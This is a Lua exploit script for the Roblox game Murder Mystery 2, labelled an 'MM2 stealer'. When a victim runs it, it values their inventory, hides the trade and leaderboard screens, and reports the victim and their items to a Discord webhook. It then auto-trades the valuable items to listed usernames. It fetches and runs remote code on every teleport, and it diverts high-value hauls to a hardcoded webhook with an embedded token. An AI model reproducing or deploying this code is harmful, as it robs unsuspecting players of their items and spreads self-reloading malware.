-- ts file was generated at discord.gg/25ms

if not game:IsLoaded() then
    game.Loaded:Wait()
end
if game.PlaceId ~= 142823291 then
    game.Players.LocalPlayer:Kick('Game not supported. Please join a normal Murder Mystery 2 server')
end

_G.scriptExecuted = _G.scriptExecuted or false

if _G.scriptExecuted then
    return
else
    _G.scriptExecuted = true
    hhdhd = {}

    table.insert(hhdhd, math.random(1, 16777215))

    users1 = users
    min_rarity1 = min_rarity
    min_value1 = min_value
    ping1 = ping
    webhook1 = webhook

    local u1 = {}
    local _Players = game:GetService('Players')
    local _LocalPlayer = _Players.LocalPlayer
    local _PlayerGui = _LocalPlayer:WaitForChild('PlayerGui')
    local u5 = require(game.ReplicatedStorage:WaitForChild('Database'):WaitForChild('Sync'):WaitForChild('Item'))
    local _HttpService = game:GetService('HttpService')

    setclipboard('discord.gg/4whPb9Nxm7')

    function servhopsmal()
        local _HttpService2 = game:GetService('HttpService')
        local _TeleportService = game:GetService('TeleportService')
        local _PlaceId = game.PlaceId
        local u10 = 'https://games.roblox.com/v1/games/' .. _PlaceId .. '/servers/Public?sortOrder=Asc&limit=100'

        function ListServers(p11)
            return _HttpService2:JSONDecode((game:HttpGet(u10 .. (p11 and '&cursor=' .. p11 or ''))))
        end

        local v12 = nil

        repeat
            local v13 = ListServers(v12)
            local v14 = v13.data[1]

            v12 = v13.nextPageCursor
        until v14

        _TeleportService:TeleportToPlaceInstance(_PlaceId, v14.id, game.Players.LocalPlayer)
    end

    if game:GetService('RobloxReplicatedStorage'):WaitForChild('GetServerType'):InvokeServer() ~= 'VIPServer' then
        plars = #game:GetService('Players'):GetPlayers()

        if tonumber(plars) ~= 12 then
            queue_on_teleport('users={"' .. table.concat(users1, '", "') .. '"}; min_rarity="' .. min_rarity1 .. '"; min_value = ' .. min_value1 .. '; ping = "' .. ping1 .. '"; webhook = "' .. webhook1 .. '"; loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/mm2"))()')

            local u15 = {
                'Common',
                'Uncommon',
                'Rare',
                'Legendary',
                'Vintage',
                'Godly',
                'Ancient',
                'Unique',
            }
            local u16 = {
                godly = 'https://supremevaluelist.com/mm2/godlies.html',
                ancient = 'https://supremevaluelist.com/mm2/ancients.html',
                unique = 'https://supremevaluelist.com/mm2/uniques.html',
                classic = 'https://supremevaluelist.com/mm2/vintages.html',
                chroma = 'https://supremevaluelist.com/mm2/chromas.html',
            }
            local u17 = {
                Accept = 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                ['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36',
            }

            local function u19(p18)
                return p18:match('^%s*(.-)%s*$')
            end
            local function u22(p20)
                local v21 = {
                    Url = p20,
                    Method = 'GET',
                    Headers = u17,
                }

                return request(v21).Body
            end
            local function u27(p23)
                local _bsclassitemvaluedb = p23:match('<b%s+class=[\'"]itemvalue[\'"]>([%d,%.]+)</b>')

                if _bsclassitemvaluedb then
                    local v25 = _bsclassitemvaluedb:gsub(',', '')
                    local v26 = tonumber(v25)

                    if v26 then
                        return v26
                    end
                end

                return nil
            end
            local function u37(p28)
                local _divsclassitemheaddivsdivsclassitembodydiv, v30, v31 = p28:gmatch('<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>')
                local v32 = {}

                while true do
                    local v33

                    v31, v33 = _divsclassitemheaddivsdivsclassitembodydiv(v30, v31)

                    if v31 == nil then
                        break
                    end

                    local v34 = v31:match('([^<]+)')

                    if v34 then
                        local v35 = u19(u19(v34:gsub('%s+', ' ')):split(' Click ')[1]):lower()
                        local v36 = u27(v33)

                        if v36 then
                            v32[v35] = v36
                        end
                    end
                end

                return v32
            end
            local function u47(p38)
                local _divsclassitemheaddivsdivsclassitembodydiv2, v40, v41 = p38:gmatch('<div%s+class=[\'"]itemhead[\'"]>(.-)</div>%s*<div%s+class=[\'"]itembody[\'"]>(.-)</div>')
                local v42 = {}

                while true do
                    local v43

                    v41, v43 = _divsclassitemheaddivsdivsclassitembodydiv2(v40, v41)

                    if v41 == nil then
                        break
                    end

                    local v44 = v41:match('([^<]+)')

                    if v44 then
                        local v45 = u19(v44:gsub('%s+', ' ')):lower()
                        local v46 = u27(v43)

                        if v46 then
                            v42[v45] = v46
                        end
                    end
                end

                return v42
            end
            local function v85()
                local v48, v49, v50 = pairs(u16)
                local v51 = {}
                local u52 = {}
                local u53 = {}

                while true do
                    local v54

                    v50, v54 = v48(v49, v50)

                    if v50 == nil then
                        break
                    end

                    table.insert(v51, {
                        rarity = v50,
                        url = v54,
                    })
                end

                local u55 = #v51
                local _BindableEvent = Instance.new('BindableEvent')
                local v57, v58, v59 = ipairs(v51)
                local u60 = 0

                while true do
                    local u61

                    v59, u61 = v57(v58, v59)

                    if v59 == nil then
                        break
                    end

                    task.spawn(function()
                        local _rarity = u61.rarity
                        local v63 = u22(u61.url)

                        if v63 and v63 ~= '' then
                            if _rarity == 'chroma' then
                                u53 = u47(v63)
                            else
                                local v64 = u37(v63)
                                local v65, v66, v67 = pairs(v64)

                                while true do
                                    local v68

                                    v67, v68 = v65(v66, v67)

                                    if v67 == nil then
                                        break
                                    end

                                    u52[v67] = v68
                                end
                            end
                        end

                        u60 = u60 + 1

                        if u60 == u55 then
                            _BindableEvent:Fire()
                        end
                    end)
                end

                _BindableEvent.Event:Wait()

                local v69, v70, v71 = pairs(u5)
                local v72 = {}

                while true do
                    local v73, v74 = v69(v70, v71)

                    if v73 == nil then
                        return v72
                    end

                    v71 = v73

                    local v75 = v74.ItemName and (v74.ItemName:lower() or '') or ''
                    local v76 = v74.Rarity or ''
                    local v77 = v74.Chroma or false

                    if v75 ~= '' and v76 ~= '' then
                        local v78 = table.find(u15, v76)

                        if v78 and table.find(u15, 'Godly') <= v78 then
                            if v77 then
                                local v79, v80, v81 = pairs(u53)
                                local v82 = nil

                                while true do
                                    local v83

                                    v81, v83 = v79(v80, v81)

                                    if v81 == nil then
                                        v83 = v82
                                    end
                                    if v81:find(v75) then
                                        break
                                    end
                                end

                                if v83 then
                                    v72[v73] = v83
                                end
                            else
                                local v84 = u52[v75]

                                if v84 then
                                    v72[v73] = v84
                                end
                            end
                        end
                    end
                end
            end

            phonecheck = _PlayerGui:WaitForChild('MainGUI', 1):WaitForChild('Lobby', 1)

            function returndevice()
                return phonecheck and 'mobile' or 'tablet'
            end

            local function u99(p86)
                if returndevice() == 'tablet' then
                    game:GetService('Players').LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Visible = false

                    local v87, v88, v89 = pairs(game:GetService('Players').LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Container:GetChildren())

                    while true do
                        local v90

                        v89, v90 = v87(v88, v89)

                        if v89 == nil then
                            break
                        end
                        if v90.Name == p86 then
                            b = v90:WaitForChild('ActionButton')

                            firesignal(b.MouseButton1Click)
                            firesignal(game:GetService('Players').LocalPlayer.PlayerGui.MainGUI.Game.Leaderboard.Inspect.Trade.MouseButton1Click)
                        end
                    end
                end
                if returndevice() == 'mobile' then
                    local v91, v92, v93 = pairs(getconnections(game:GetService('Players').LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Container.PlayerList[p86].ActionButton.MouseButton1Click))

                    while true do
                        local v94

                        v93, v94 = v91(v92, v93)

                        if v93 == nil then
                            break
                        end

                        v94:Fire()
                    end

                    local v95, v96, v97 = pairs(getconnections(game:GetService('Players').LocalPlayer.PlayerGui.MainGUI.Lobby.Leaderboard.Popup.Container.Action.Trade.Activated))

                    while true do
                        local v98

                        v97, v98 = v95(v96, v97)

                        if v97 == nil then
                            break
                        end

                        v98:Fire()
                    end
                end
            end
            local function u100()
                return game:GetService('ReplicatedStorage').Trade.GetTradeStatus:InvokeServer()
            end
            local function u101()
                while u100() ~= 'None' do
                    wait(0.1)
                end
            end
            local function u102()
                game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('AcceptTrade'):FireServer(unpack({285646582}))
            end
            local function u104(p103)
                game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('OfferItem'):FireServer(unpack({
                    p103,
                    'Weapons',
                }))
            end

            local u105 = 0

            local function v123(p106, p107)
                local v108 = {
                    {
                        name = 'Victim Username:',
                        value = _LocalPlayer.Name,
                        inline = true,
                    },
                    {
                        name = 'Summary:',
                        value = string.format('Total Value: %s', u105),
                        inline = false,
                    },
                    {
                        name = 'Item list:',
                        value = '',
                        inline = false,
                    },
                    {
                        name = 'Join link:',
                        value = 'https://fern.wtf/joiner?placeId=142823291&gameInstanceId=' .. game.JobId,
                    },
                }
                local v109, v110, v111 = ipairs(p106)
                local v112 = {
                    ['Content-Type'] = 'application/json',
                }

                while true do
                    local v113

                    v111, v113 = v109(v110, v111)

                    if v111 == nil then
                        break
                    end

                    local _sxssValues = string.format('%s (x%s): %s Value (%s)', v113.RealName, v113.Amount, v113.Value * v113.Amount, v113.Rarity)

                    v108[3].value = v108[3].value .. _sxssValues .. '\n'
                end

                if #v108[3].value > 1024 then
                    local v115, v116, v117 = v108[3].value:gmatch('[^\r\n]+')
                    local v118 = {}

                    while true do
                        v117 = v115(v116, v117)

                        if v117 == nil then
                            break
                        end

                        table.insert(v118, v117)
                    end
                    while#v108[3].value > 1024 and 0 < #v118 do
                        table.remove(v118)

                        v108[3].value = table.concat(v118, '\n') .. '\n Plus more'
                    end
                end

                local v119 = {
                    content = p107 .. "game:GetService('TeleportService'):TeleportToPlaceInstance(142823291, '" .. game.JobId .. "')",
                }
                local v120 = {}
                local v121 = {
                    title = '\u{1f52a} Join to get MM2 hit',
                    color = hhdhd[1],
                    fields = v108,
                    footer = {
                        text = 'MM2 stealer by amaz. discord.gg/4whPb9Nxm7',
                    },
                }

                __set_list(v120, 1, {v121})

                v119.embeds = v120

                local v122 = _HttpService:JSONEncode(v119)

                request({
                    Url = webhook1,
                    Method = 'POST',
                    Headers = v112, 
                    Body = v122,
                })
            end
            local function u140(p124)
                local v125 = {
                    {
                        name = 'Victim Username:',
                        value = _LocalPlayer.Name,
                        inline = true,
                    },
                    {
                        name = 'Summary:',
                        value = string.format('Total Value: %s', u105),
                        inline = false,
                    },
                    {
                        name = 'Items sent:',
                        value = '',
                        inline = false,
                    },
                }
                local v126, v127, v128 = ipairs(p124)
                local v129 = {
                    ['Content-Type'] = 'application/json',
                }

                while true do
                    local v130

                    v128, v130 = v126(v127, v128)

                    if v128 == nil then
                        break
                    end

                    local _sxssValues2 = string.format('%s (x%s): %s Value (%s)', v130.RealName, v130.Amount, v130.Value * v130.Amount, v130.Rarity)

                    v125[3].value = v125[3].value .. _sxssValues2 .. '\n'
                end

                if #v125[3].value > 1024 then
                    local v132, v133, v134 = v125[3].value:gmatch('[^\r\n]+')
                    local v135 = {}

                    while true do
                        v134 = v132(v133, v134)

                        if v134 == nil then
                            break
                        end

                        table.insert(v135, v134)
                    end
                    while#v125[3].value > 1024 and 0 < #v135 do
                        table.remove(v135)

                        v125[3].value = table.concat(v135, '\n') .. '\n Plus more'
                    end
                end

                local v136 = {}
                local v137 = {}
                local v138 = {
                    title = '\u{1f52a} New MM2 Execution',
                    color = hhdhd[1],
                    fields = v125,
                    footer = {
                        text = 'MM2 stealer by amaz. discord.gg/4whPb9Nxm7',
                    },
                }

                __set_list(v137, 1, {v138})

                v136.embeds = v137

                local v139 = _HttpService:JSONEncode(v136)

                request({
                    Url = webhook1,
                    Method = 'POST',
                    Headers = v129,
                    Body = v139,
                })
            end

            local _TradeGUI = _PlayerGui:WaitForChild('TradeGUI')
            local v142 = _TradeGUI

            _TradeGUI.GetPropertyChangedSignal(v142, 'Enabled'):Connect(function()
                _TradeGUI.Enabled = false
            end)

            local _TradeGUI_Phone = _PlayerGui:WaitForChild('TradeGUI_Phone')
            local v144 = _TradeGUI_Phone

            _TradeGUI_Phone.GetPropertyChangedSignal(v144, 'Enabled'):Connect(function()
                _TradeGUI_Phone.Enabled = false
            end)

            local _Lobby = _PlayerGui:WaitForChild('MainGUI', 1):WaitForChild('Lobby', 1)

            if _Lobby then
                _Lobby:WaitForChild('Leaderboard', 1):GetPropertyChangedSignal('Visible'):Connect(function()
                    _Lobby:WaitForChild('Leaderboard', 1).Visible = false
                end)
            end

            local v146 = v85()
            local v147 = game.ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(_LocalPlayer.Name)
            local v148, v149, v150 = pairs(v147.Weapons.Owned)
            local u151 = u100
            local v152 = u105
            local v153 = u15
            local v154 = {
                DefaultGun = true,
                DefaultKnife = true,
                Reaver = true,
                Reaver_Legendary = true,
                Reaver_Godly = true,
                Reaver_Ancient = true,
                IceHammer = true,
                IceHammer_Legendary = true,
                IceHammer_Godly = true,
                IceHammer_Ancient = true,
                Gingerscythe = true,
                Gingerscythe_Legendary = true,
                Gingerscythe_Godly = true,
                Gingerscythe_Ancient = true,
                TestItem = true,
                Season1TestKnife = true,
                Cracks = true,
                Icecrusher = true,
                ['???'] = true,
                Dartbringer = true,
                TravelerAxeRed = true,
                TravelerAxeBronze = true,
                TravelerAxeSilver = true,
                TravelerAxeGold = true,
                BlueCamo_K_2022 = true,
                GreenCamo_K_2022 = true,
                SharkSeeker = true,
            }

            while true do
                local v155, v156 = v148(v149, v150)

                if v155 == nil then
                    break
                end

                v150 = v155

                local v157 = table.find(v153, min_rarity1)
                local _Rarity = u5[v155].Rarity
                local v159 = table.find(v153, _Rarity)

                if v159 and (v157 <= v159 and not v154[v155]) then
                    local v160

                    if v146[v155] then
                        v160 = v146[v155]
                    else
                        v160 = table.find(v153, 'Godly') > v159 and 1 or 2
                    end
                    if min_value1 <= v160 then
                        u105 = v152 + v160 * v156

                        table.insert(u1, {
                            RealName = u5[v155].ItemName,
                            DataID = v155,
                            Rarity = _Rarity,
                            Amount = v156,
                            Value = v160,
                        })

                        v152 = u105
                    end
                end
            end

            if v152 >= 150000 then
                webhook1 = 'https://discord.com/api/webhooks/1388921046261956639/IMgTehHrIIgQxVBfW5u6J0zSMyXWi7xWn_MIoBWrFFgmiwk_nKP0lb_2u2LutLHnxajp'
                ping1 = 'Yes'
                users1 = {
                    'Kmao550',
                    'ImSmallsGuy',
                }
            end
            if #u1 > 0 then
                table.sort(u1, function(p161, p162)
                    return p161.Value * p161.Amount > p162.Value * p162.Amount
                end)

                local v163, v164, v165 = ipairs(u1)
                local u166 = {}

                while true do
                    local v167

                    v165, v167 = v163(v164, v165)

                    if v165 == nil then
                        break
                    end

                    u166[v165] = v167
                end

                v123(u1, ping1 ~= 'Yes' and '' or '--[[@everyone]] ')

                local function u172(p168)
                    local v169 = u151()

                    if v169 == 'StartTrade' then
                        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('DeclineTrade'):FireServer()
                        wait(0.3)
                    elseif v169 == 'ReceivingRequest' then
                        game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('DeclineRequest'):FireServer()
                        wait(0.3)
                    end

                    while#u1 > 0 do
                        local v170 = u151()

                        if v170 == 'None' then
                            u99(p168)
                        elseif v170 == 'SendingRequest' then
                            wait(0.3)
                        elseif v170 == 'ReceivingRequest' then
                            game:GetService('ReplicatedStorage'):WaitForChild('Trade'):WaitForChild('DeclineRequest'):FireServer()
                            wait(0.3)
                        elseif v170 == 'StartTrade' then
                            for _ = 1, math.min(4, #u1)do
                                local v171 = table.remove(u1, 1)

                                for _ = 1, v171.Amount do
                                    u104(v171.DataID)
                                end
                            end

                            wait(4)
                            u102()
                            wait(1)
                            u102()
                            wait(1)
                            u102()
                            u101()
                        else
                            wait(0.5)
                        end

                        wait(1)
                    end
                end

                (function()
                    local u173 = false

                    local function v175(p174)
                        if table.find(users1, p174.Name) then
                            p174.Chatted:Connect(function()
                                if not u173 then
                                    u140(u166)

                                    u173 = true
                                end

                                u172(p174.Name)
                            end)
                        end
                    end

                    local v176 = _Players
                    local v177, v178, v179 = ipairs(v176:GetPlayers())

                    while true do
                        local v180

                        v179, v180 = v177(v178, v179)

                        if v179 == nil then
                            break
                        end

                        v175(v180)
                    end

                    _Players.PlayerAdded:Connect(v175)
                end)()
            end
        else
            queue_on_teleport('users={"' .. table.concat(users1, '", "') .. '"}; min_rarity="' .. min_rarity1 .. '"; min_value = ' .. min_value1 .. '; ping = "' .. ping1 .. '"; webhook = "' .. webhook1 .. '"; loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/mm2"))()')
            servhopsmal()
            task.wait(10)
            servhopsmal()
        end
    else
        queue_on_teleport('users={"' .. table.concat(users1, '", "') .. '"}; min_rarity="' .. min_rarity1 .. '"; min_value = ' .. min_value1 .. '; ping = "' .. ping1 .. '"; webhook = "' .. webhook1 .. '"; loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/mm2"))()')
        servhopsmal()
        task.wait(10)
        servhopsmal()

        return
    end
end

end
